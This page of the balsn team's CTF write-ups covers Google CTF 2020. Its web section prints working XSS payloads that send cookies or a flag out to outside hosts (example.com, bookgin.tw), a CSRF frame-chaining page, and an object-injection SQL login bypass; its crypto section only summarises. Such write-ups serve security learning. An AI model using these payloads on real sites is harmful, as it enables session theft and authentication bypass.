@@ -1,0 +1,368 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Google CTF 2020</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pasteurize">pasteurize</a>
+    
+                <a class="dropdown-item" href="#tech-support">tech-support</a>
+    
+                <a class="dropdown-item" href="#log-me-in">log-me-in</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#oracle">oracle</a>
+    
+                <a class="dropdown-item" href="#yafm">yafm</a>
+    
+                <a class="dropdown-item" href="#quantum-pyramids">quantum-pyramids</a>
+    
+                <a class="dropdown-item" href="#sharky">sharky</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#pasteurize" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pasteurize</span>
+            </a>
+    
+<a href="#tech-support" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tech-support</span>
+            </a>
+    
+<a href="#log-me-in" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">log-me-in</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#oracle" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">oracle</span>
+            </a>
+    
+<a href="#yafm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">yafm</span>
+            </a>
+    
+<a href="#quantum-pyramids" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">quantum-pyramids</span>
+            </a>
+    
+<a href="#sharky" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sharky</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="google-ctf-2020"><a class="header-link" href="#google-ctf-2020"></a>Google CTF 2020</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="pasteurize"><a class="header-link" href="#pasteurize"></a>Pasteurize</h3>
+<p>First, spot the <code>/source</code> in web source code. The backend is a nodejs server.</p>
+<pre class="hljs"><code>app.use(bodyParser.urlencoded({
+  <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>
+}));
+
+<span class="hljs-comment">// ...</span>
+
+<span class="hljs-keyword">const</span> escape_string = <span class="hljs-function"><span class="hljs-params">unsafe</span> =&gt;</span> <span class="hljs-built_in">JSON</span>.stringify(unsafe).slice(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)
+  .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">'\\x3C'</span>).replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">'\\x3E'</span>);
+
+<span class="hljs-comment">// ...</span>
+
+app.get(<span class="hljs-string">'/:id([a-f0-9\-]{36})'</span>, recaptcha.middleware.render, utils.cache_mw, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+  <span class="hljs-keyword">const</span> note_id = req.params.id;
+  <span class="hljs-keyword">const</span> note = <span class="hljs-keyword">await</span> DB.get_note(note_id);
+
+  <span class="hljs-keyword">if</span> (note == <span class="hljs-literal">null</span>) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">"Paste not found or access has been denied."</span>);
+  }
+
+  <span class="hljs-keyword">const</span> unsafe_content = note.content;
+  <span class="hljs-keyword">const</span> safe_content = escape_string(unsafe_content);
+
+  res.render(<span class="hljs-string">'note_public'</span>, {
+    <span class="hljs-attr">content</span>: safe_content,
+    <span class="hljs-attr">id</span>: note_id,
+    <span class="hljs-attr">captcha</span>: res.recaptcha
+  });
+});</code></pre><p>So <code>example.com&lt;foo&gt;&quot;bar&quot;</code> will become <code>const note = &quot;example.com\x3Cfoo\x3E\&quot;bar\&quot;&quot;;</code>. The double quotes are encoded because of <code>JSON.stringify</code>.</p>
+<p>However, the <code>escape_string</code> logic is weird, especially the <code>slice</code> one. The slice is intended to prune <code>&quot;example.com&quot;</code> to <code>example.com</code>.</p>
+<p>Since we have <code>bodyParser</code> <code>extended: true</code>, we can send an array into the request object. If we make the content an array, the behavior of slice function will become</p>
+<pre class="hljs"><code>[<span class="hljs-string">"example.com"</span>] -&gt; <span class="hljs-string">"example.com"</span></code></pre><p>That is, we can preserve the double quotes, and it leads to javascript injection. The final payload:</p>
+<pre class="hljs"><code>content[]=;<span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://example.com/?'</span>+btoa(<span class="hljs-built_in">document</span>.cookie);<span class="hljs-comment">//</span>
+
+<span class="hljs-comment">// CTF{Express_t0_Tr0ubl3s}</span></code></pre><h3 id="tech-support"><a class="header-link" href="#tech-support"></a>Tech Support</h3>
+<p>In this challenge, the admin has cookies in <code>typeselfsub.web.ctfcompetition.com/</code>. The domain has a self-XSS requireing the user to see his/her profiles. That is, unless admin is logout and log in to our account, the XSS will not be triggered.</p>
+<p>Addtionally, the XSS bot admin will browse pages in <code>typeselfsub-support.web.ctfcompetition.com/</code>. The page has an easy XSS.</p>
+<p>The question is: how to abuse self-XSS to steal the flag?</p>
+<p>We can just keep the logged-in admin frame there, and then CSRF to login our account and execute XSS payload to steal the page content. This does not violate same-origin policy because the two frames still belong to the same domains.</p>
+<p>So first, redirect the admin to a website that we controlled.</p>
+<pre class="hljs"><code>&lt;<span class="hljs-selector-tag">img</span> src=z onerror=document<span class="hljs-selector-class">.location</span><span class="hljs-selector-class">.href</span>=<span class="hljs-string">"https://bookgin.tw/"</span>&gt;&lt;/img&gt;</code></pre><p>Next, we open three frames here:</p>
+<ol class="list">
+<li>Admin&#39;s frame containg the flag</li>
+<li>logout admin&#39;s account</li>
+<li>login to our account and execute XSS</li>
+</ol>
+<p>index.html:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">500</span> <span class="hljs-attr">height</span>=<span class="hljs-string">800</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"i0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">500</span> <span class="hljs-attr">height</span>=<span class="hljs-string">800</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"i1"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"login.html"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">500</span> <span class="hljs-attr">height</span>=<span class="hljs-string">800</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"i2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+!<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"start!"</span>);
+  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">"#i0"</span>).src = <span class="hljs-string">"https://typeselfsub.web.ctfcompetition.com/flag"</span>;
+  <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> setTimeout(r, <span class="hljs-number">2000</span>));
+  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">"#i1"</span>).src = <span class="hljs-string">"https://typeselfsub.web.ctfcompetition.com/logout"</span>;
+  <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> setTimeout(r, <span class="hljs-number">2000</span>));
+  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">"#i2"</span>).contentDocument.querySelector(<span class="hljs-string">"form"</span>).submit();
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"done"</span>);
+}();
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>login.html:</p>
+<pre class="hljs"><code>&lt;form method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span> action=<span class="hljs-string">"https://typeselfsub.web.ctfcompetition.com/login"</span>&gt;
+    &lt;input value=<span class="hljs-string">"foobartw"</span> type=<span class="hljs-string">"text"</span> id=<span class="hljs-string">"username"</span> name=<span class="hljs-string">"username"</span>&gt;
+    &lt;input value=<span class="hljs-string">"foobartw"</span> type=<span class="hljs-string">"password"</span> id=<span class="hljs-string">"password"</span> name=<span class="hljs-string">"password"</span>&gt;
+    &lt;input type=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"csrf"</span> value=<span class="hljs-string">""</span>&gt;
+&lt;/form&gt;</code></pre><p>Finally, the profile page in frame 3 will execute XSS in <code>typeselfsub.web.ctfcompetition.com/</code> domain.</p>
+<pre class="hljs"><code>&lt;script&gt;fetch('https<span class="hljs-symbol">://bookgin</span>.tw/?'+btoa(<span class="hljs-name">parent</span>.frames[<span class="hljs-number">0</span>].document.getElementById('flag').innerText))&lt;/script&gt;</code></pre><p>where <code>parent.frames[0]</code> is the frame containg admin&#39;s flag.</p>
+<p>Flag: <code>CTF{self-xss?-that-isn&#39;t-a-problem-right...}</code></p>
+<p>For an unintended solution which leaks admin secret route URL via referer, please see <a href="https://pop-eax.github.io/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/">this writeup by pop_eax</a>.</p>
+<h3 id="log-me-in"><a class="header-link" href="#log-me-in"></a>LOG-ME-IN</h3>
+<p>From the source code <code>app.js</code>, we can found the <code>login</code> API</p>
+<pre class="hljs"><code>...
+const u = req.body[<span class="hljs-string">'username'</span>];
+<span class="hljs-keyword">const</span> p = req.body[<span class="hljs-string">'password'</span>];
+
+<span class="hljs-keyword">const</span> con = DBCon(); <span class="hljs-comment">// mysql.createConnection(...).connect()</span>
+
+<span class="hljs-keyword">const</span> sql = <span class="hljs-string">'Select * from users where username = ? and password = ?'</span>;
+con.query(sql, [u, p], callbackFunction)
+...</code></pre><p>It parses <code>username</code> and <code>password</code> from body, and uses them as prepared SQL statement parameter without checking whether they are strings or converting them to string.</p>
+<p>And since <code>bodyParser</code> <code>extended: true</code>, we can send an object to <code>username</code> and <code>password</code></p>
+<p>By reading how nodejs mysql <a href="https://github.com/mysqljs/mysql#escaping-query-values">Escaping query values</a> , we can see that it will convert object into format such as</p>
+<pre class="hljs"><code>`key1`=value1, `key2`=value2 </code></pre><p>For example</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mysql'</span>)
+mysql.format(<span class="hljs-string">'SELECT * from example WHERE id = ?'</span>, {<span class="hljs-string">'a'</span>:<span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>:<span class="hljs-string">'d'</span>})
+<span class="hljs-comment">//SELECT * from example WHERE id = `a` = 'b', `c` = 'd'</span></code></pre><p>Therefore, we can send <code>username=Michelle&amp;password[password]=1</code> to inject an object into the query, and the query will become</p>
+<pre class="hljs"><code><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">'Michelle'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">`password`</span> = <span class="hljs-string">'1'</span></code></pre><p>And then we can successfully log in to get the flag
+Flag: <code>CTF{a-premium-effort-deserves-a-premium-flag}</code></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="oracle"><a class="header-link" href="#oracle"></a>Oracle</h3>
+<h4 id="tl;dr"><a class="header-link" href="#tl;dr"></a>TL;DR</h4>
+<p>(In subtask 2, I&#39;ve developed some techniques that reduce the query number down to 170. See the last part for those tricky optimizations.)</p>
+<p>Subtask 1</p>
+<ol class="list">
+<li>Encrypt one all zero plaintext for the base case</li>
+<li>Encrypt two different input differences for each blocks</li>
+<li>Recover all states except S1, S5 with those differences</li>
+<li>Recover S1, S5 from the ciphertext and states.</li>
+</ol>
+<p>Subtask 2</p>
+<ol class="list">
+<li>Leak 6 blocks of plaintext</li>
+<li>Same as subtask 1</li>
+</ol>
+<p>Subtask 2 in a hard way</p>
+<ol class="list">
+<li>Reduce the fetches of the base case by using per byte difference</li>
+<li>Reduce the size of additional checksum</li>
+</ol>
+<p><a href="https://sasdf.github.io/ctf/writeup/2020/google/crypto/oracle/">Here&#39;s the full writeup</a></p>
+<h3 id="yafm"><a class="header-link" href="#yafm"></a>YAFM</h3>
+<h4 id="tl;dr-1"><a class="header-link" href="#tl;dr-1"></a>TL;DR</h4>
+<ol class="list">
+<li>Model the probability of a factor guess with binomial and hypergeometric distribution</li>
+<li>Run best-first search to get lower bits</li>
+<li>Factor the public key using Coppersmith&#39;s method</li>
+</ol>
+<p><a href="https://sasdf.github.io/ctf/writeup/2020/google/crypto/yafm/">Here&#39;s the full writeup</a></p>
+<h3 id="quantum-pyramids"><a class="header-link" href="#quantum-pyramids"></a>Quantum Pyramids</h3>
+<h4 id="tl;dr-2"><a class="header-link" href="#tl;dr-2"></a>TL;DR</h4>
+<ol class="list">
+<li>Collect some signatures until all secrets are revealed</li>
+<li>Hook on the code of sphincs+ to build the full hash tree</li>
+<li>Generate the signature with the hash tree</li>
+</ol>
+<p><a href="https://sasdf.github.io/ctf/writeup/2020/google/crypto/quantum/">Here&#39;s the full writeup</a></p>
+<h3 id="sharky"><a class="header-link" href="#sharky"></a>SHArky</h3>
+<h4 id="tl;dr-3"><a class="header-link" href="#tl;dr-3"></a>TL;DR</h4>
+<ol class="list">
+<li>Subtract the IV from the output</li>
+<li>Undo last 56 rounds</li>
+<li>Recover round constants from 8 to 1 by propagating the error the first round.</li>
+</ol>
+<p><a href="https://sasdf.github.io/ctf/writeup/2020/google/crypto/sharky/">Here&#39;s the full writeup</a></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
